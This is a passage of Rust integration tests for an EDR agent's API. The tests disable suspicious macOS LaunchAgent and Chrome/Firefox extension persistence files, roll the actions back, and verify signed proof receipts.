        let payload: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("failed to decode expiring disable persistence response: {e}")
        });
        assert_eq!(payload["execution"]["action"], "disable_persistence");
        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing expiring disable persistence execution id"));
        assert!(!source_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing expiring disabled persistence artifact path")),
        );
        assert!(disabled_path.is_file());

        tokio::time::sleep(Duration::from_millis(1100)).await;

        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-executions/expire")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| {
                panic!("failed to build disable persistence expiration request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("disable persistence expiration request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read disable persistence expiration response: {e}")
            });
        let expiration_payload: serde_json::Value =
            serde_json::from_slice(&bytes).unwrap_or_else(|e| {
                panic!("failed to decode disable persistence expiration response: {e}")
            });
        assert_eq!(expiration_payload["expired_count"], 0);
        assert_eq!(expiration_payload["rollback_count"], 1);
        assert_eq!(
            expiration_payload["rollbacks"][0]["effects"][0]["effectType"],
            "restore_persistence_file"
        );
        assert!(source_path.is_file());
        assert!(!disabled_path.exists());
        assert_eq!(
            std::fs::read(&source_path).unwrap_or_else(|e| panic!(
                "failed to read restored expiring persistence file: {e}"
            )),
            launch_agent_bytes
        );
        assert_eq!(
            expiration_payload["rollback_receipts"][0]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_rollback"
        );

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| {
                panic!("failed to build disable persistence expiration proof request: {e}")
            });
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("disable persistence expiration proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read disable persistence expiration proof response: {e}")
            });
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected disable persistence expiration proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("failed to decode disable persistence expiration proof response: {e}")
        });
        assert_eq!(
            proof_payload["execution"]["execution"]["executionId"],
            payload["execution"]["executionId"]
        );
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| {
                panic!("missing disable persistence expiration proof transition receipts")
            });
        assert_eq!(transition_receipts.len(), 1);
        let transition_decision =
            &transition_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(transition_decision["receiptFamily"], "response_execution");
        assert_eq!(
            transition_decision["decision"]["title"],
            "Endpoint response action rolled back"
        );
        assert_eq!(
            transition_decision["decision"]["action"],
            serde_json::Value::String("disable_persistence".to_string())
        );
        assert_eq!(
            transition_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        let rollback_receipts = proof_payload["rollbackReceipts"]
            .as_array()
            .unwrap_or_else(|| {
                panic!("missing disable persistence expiration proof rollback receipts")
            });
        assert_eq!(rollback_receipts.len(), 1);
        let rollback_decision = &rollback_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(rollback_decision["receiptFamily"], "response_rollback");
        assert_eq!(
            rollback_decision["decision"]["action"],
            serde_json::Value::String("disable_persistence".to_string())
        );
        assert_eq!(
            rollback_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(launch_agents_dir);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
        let _ = std::fs::remove_file(&execution_path);
    }

    #[tokio::test]
    async fn agent_edr_response_action_executes_disable_persistence_with_rollback_receipts() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[86u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-disable-persistence-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let launch_agents_dir = std::env::temp_dir().join(format!(
            "clawdstrike-launch-agents-{}-{counter}/Library/LaunchAgents",
            std::process::id()
        ));
        std::fs::create_dir_all(&launch_agents_dir)
            .unwrap_or_else(|e| panic!("failed to create launch agents dir: {e}"));
        let source_path = launch_agents_dir.join("com.example.agent.plist");
        std::fs::write(
            &source_path,
            br#"<?xml version="1.0"?><plist><dict><key>Label</key><string>com.example.agent</string></dict></plist>"#,
        )
        .unwrap_or_else(|e| panic!("failed to write launch agent plist: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-persistence-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::LaunchPersistence {
                path: source_path.display().to_string(),
                label: Some("com.example.agent".to_string()),
                operation: FileOperation::Create,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build persistence findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("persistence findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing launch persistence file graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": file_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious launch agent",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build disable persistence request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("disable persistence request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read disable persistence response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode disable persistence response: {e}"));

        assert_eq!(payload["plan"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["effectType"],
            "disable_persistence"
        );
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert!(!source_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing disabled persistence artifact path")),
        );
        assert!(disabled_path.is_file());
        assert_eq!(
            std::fs::read(&disabled_path)
                .unwrap_or_else(|e| panic!("failed to read disabled persistence artifact: {e}")),
            br#"<?xml version="1.0"?><plist><dict><key>Label</key><string>com.example.agent</string></dict></plist>"#
        );

        let execution_receipt: SignedReceipt =
            serde_json::from_value(payload["executionReceipt"].clone()).unwrap_or_else(|e| {
                panic!("failed to decode disable persistence execution receipt: {e}")
            });
        let endpoint_decision = execution_receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing disable persistence endpointDecision metadata"));
        assert_eq!(endpoint_decision["receiptFamily"], "response_execution");
        assert_eq!(
            endpoint_decision["decision"]["action"],
            serde_json::Value::String("disable_persistence".to_string())
        );
        assert_eq!(
            endpoint_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        assert!(endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing disable persistence receipt evidence"))
            .iter()
            .any(|item| item["key"]
                .as_str()
                .is_some_and(|key| key.starts_with("executionEffect:"))));

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing disable persistence execution id"));
        let body = serde_json::json!({
            "reason": "restore disabled launch agent"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build persistence rollback request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("persistence rollback request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read persistence rollback response: {e}"));
        let rollback_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode persistence rollback response: {e}"));
        assert_eq!(
            rollback_payload["rollback"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            rollback_payload["rollback"]["effects"][0]["effectType"],
            "restore_persistence_file"
        );
        assert!(source_path.is_file());
        assert!(!disabled_path.exists());

        let rollback_receipt: SignedReceipt =
            serde_json::from_value(rollback_payload["receipt"].clone()).unwrap_or_else(|e| {
                panic!("failed to decode disable persistence rollback receipt: {e}")
            });
        let rollback_decision = rollback_receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing persistence rollback endpointDecision metadata"));
        assert_eq!(rollback_decision["receiptFamily"], "response_rollback");
        assert_eq!(
            rollback_decision["decision"]["action"],
            serde_json::Value::String("disable_persistence".to_string())
        );
        assert!(rollback_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing persistence rollback receipt evidence"))
            .iter()
            .any(|item| item["key"]
                .as_str()
                .is_some_and(|key| key.starts_with("rollbackEffect:"))));

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build disable persistence proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("disable persistence proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read disable persistence proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected disable persistence proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode disable persistence proof response: {e}"));
        assert_eq!(
            proof_payload["execution"]["execution"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            proof_payload["requestReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_request"
        );
        assert_eq!(
            proof_payload["executionReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_execution"
        );
        assert_eq!(
            proof_payload["evidenceBundleReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "evidence_bundle_manifest"
        );
        assert_eq!(
            proof_payload["evidenceBundleArtifact"]["bundleId"],
            payload["execution"]["evidenceBundle"]["bundleId"]
        );
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing disable persistence proof transition receipts"));
        assert_eq!(transition_receipts.len(), 1);
        let transition_decision =
            &transition_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(transition_decision["receiptFamily"], "response_execution");
        assert_eq!(
            transition_decision["decision"]["title"],
            "Endpoint response action rolled back"
        );
        assert_eq!(
            transition_decision["decision"]["action"],
            serde_json::Value::String("disable_persistence".to_string())
        );
        assert_eq!(
            transition_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        let proof_rollback_receipts = proof_payload["rollbackReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing disable persistence proof rollback receipts"));
        assert_eq!(proof_rollback_receipts.len(), 1);
        let proof_rollback_decision =
            &proof_rollback_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(
            proof_rollback_decision["receiptFamily"],
            "response_rollback"
        );
        assert_eq!(
            proof_rollback_decision["decision"]["action"],
            serde_json::Value::String("disable_persistence".to_string())
        );
        assert_eq!(
            proof_rollback_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        let acknowledgement_receipts = proof_payload["acknowledgementReceipts"]
            .as_array()
            .unwrap_or_else(|| {
                panic!("missing disable persistence proof acknowledgement receipts")
            });
        assert!(acknowledgement_receipts.is_empty());

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(launch_agents_dir);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_action_disables_browser_extension_manifest_with_rollback_and_proof()
    {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[87u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-browser-extension-persistence-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let extension_dir = std::env::temp_dir().join(format!(
            "clawdstrike-browser-extension-{}-{counter}/Users/alice/Library/Application Support/Google/Chrome/Default/Extensions/abcdefghijklmnopabcdefghijklmnop/1.0.0",
            std::process::id()
        ));
        std::fs::create_dir_all(&extension_dir)
            .unwrap_or_else(|e| panic!("failed to create browser extension dir: {e}"));
        let manifest_path = extension_dir.join("manifest.json");
        std::fs::write(
            &manifest_path,
            br#"{"manifest_version":3,"name":"Suspicious Extension","version":"1.0.0"}"#,
        )
        .unwrap_or_else(|e| panic!("failed to write browser extension manifest: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-browser-extension-1".to_string()),
                image: Some(
                    "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome".to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::BrowserExtensionInstall {
                browser: "chrome".to_string(),
                extension_id: Some("abcdefghijklmnopabcdefghijklmnop".to_string()),
                path: extension_dir.display().to_string(),
                source: Some("developer_mode".to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build browser extension findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("browser extension findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let extension_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::BrowserExtension
                        && node.label == extension_dir.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing browser extension graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": extension_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious browser extension",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build browser extension response request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("browser extension response request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read browser extension response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode browser extension response: {e}"));

        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            manifest_path.display().to_string()
        );
        assert!(!manifest_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing browser extension disabled artifact path")),
        );
        assert!(disabled_path.is_file());

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing browser extension execution id"));
        let body = serde_json::json!({
            "reason": "restore browser extension manifest"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build browser extension rollback request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("browser extension rollback request failed: {e}"));
        let rollback_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read browser extension rollback response: {e}"));
        assert_eq!(
            rollback_status,
            StatusCode::OK,
            "unexpected browser extension rollback response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let rollback_payload: serde_json::Value =
            serde_json::from_slice(&bytes).unwrap_or_else(|e| {
                panic!("failed to decode browser extension rollback response: {e}")
            });
        assert_eq!(
            rollback_payload["rollback"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            rollback_payload["rollback"]["effects"][0]["effectType"],
            "restore_persistence_file"
        );
        assert!(manifest_path.is_file());
        assert!(!disabled_path.exists());

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build browser extension proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("browser extension proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read browser extension proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected browser extension proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode browser extension proof response: {e}"));
        assert_eq!(
            proof_payload["execution"]["execution"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            proof_payload["requestReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_request"
        );
        assert_eq!(
            proof_payload["executionReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_execution"
        );
        assert_eq!(
            proof_payload["evidenceBundleReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "evidence_bundle_manifest"
        );
        assert_eq!(
            proof_payload["evidenceBundleArtifact"]["bundleId"],
            payload["execution"]["evidenceBundle"]["bundleId"]
        );
        assert_eq!(
            proof_payload["execution"]["execution"]["effects"][0]["target"],
            manifest_path.display().to_string()
        );
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing browser extension proof transition receipts"));
        assert_eq!(transition_receipts.len(), 1);
        let transition_decision =
            &transition_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(transition_decision["receiptFamily"], "response_execution");
        assert_eq!(
            transition_decision["decision"]["title"],
            "Endpoint response action rolled back"
        );
        assert_eq!(
            transition_decision["decision"]["action"],
            serde_json::Value::String("disable_persistence".to_string())
        );
        assert_eq!(
            transition_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        let rollback_receipts = proof_payload["rollbackReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing browser extension proof rollback receipts"));
        assert_eq!(rollback_receipts.len(), 1);
        let rollback_decision = &rollback_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(rollback_decision["receiptFamily"], "response_rollback");
        assert_eq!(
            rollback_decision["decision"]["action"],
            serde_json::Value::String("disable_persistence".to_string())
        );
        assert_eq!(
            rollback_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        let acknowledgement_receipts = proof_payload["acknowledgementReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing browser extension proof acknowledgement receipts"));
        assert!(acknowledgement_receipts.is_empty());

        let _ = std::fs::remove_dir_all(extension_dir);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_action_disables_firefox_extension_manifest_with_rollback_and_proof()
    {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[90u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-firefox-extension-persistence-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let firefox_root = std::env::temp_dir().join(format!(
            "clawdstrike-firefox-extension-{}-{counter}",
            std::process::id()
        ));
        let extension_dir = firefox_root
            .join("Users/alice/Library/Application Support/Firefox/Profiles/dev.default/extensions/addon@example.com");
        std::fs::create_dir_all(&extension_dir)
            .unwrap_or_else(|e| panic!("failed to create firefox extension dir: {e}"));
        let manifest_path = extension_dir.join("manifest.json");
        std::fs::write(
            &manifest_path,
            br#"{"manifest_version":2,"name":"Suspicious Firefox Extension","version":"1.0.0"}"#,
        )
        .unwrap_or_else(|e| panic!("failed to write firefox extension manifest: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-firefox-extension-1".to_string()),
                image: Some("/Applications/Firefox.app/Contents/MacOS/firefox".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::BrowserExtensionInstall {
                browser: "firefox".to_string(),
                extension_id: Some("addon@example.com".to_string()),
                path: extension_dir.display().to_string(),
                source: Some("developer_mode".to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build firefox extension findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("firefox extension findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let extension_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::BrowserExtension
                        && node.label == extension_dir.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing firefox extension graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": extension_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious firefox extension",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build firefox extension response request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("firefox extension response request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read firefox extension response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode firefox extension response: {e}"));
        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            manifest_path.display().to_string()
        );
        assert!(!manifest_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing firefox extension disabled artifact path")),
        );
        assert!(disabled_path.is_file());

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing firefox extension execution id"));
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(
                serde_json::json!({"reason": "restore firefox extension manifest"}).to_string(),
            ))
            .unwrap_or_else(|e| panic!("failed to build firefox extension rollback request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("firefox extension rollback request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        assert!(manifest_path.is_file());
        assert!(!disabled_path.exists());

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build firefox extension proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("firefox extension proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read firefox extension proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected firefox extension proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode firefox extension proof response: {e}"));
        assert_eq!(
            proof_payload["execution"]["execution"]["executionId"],
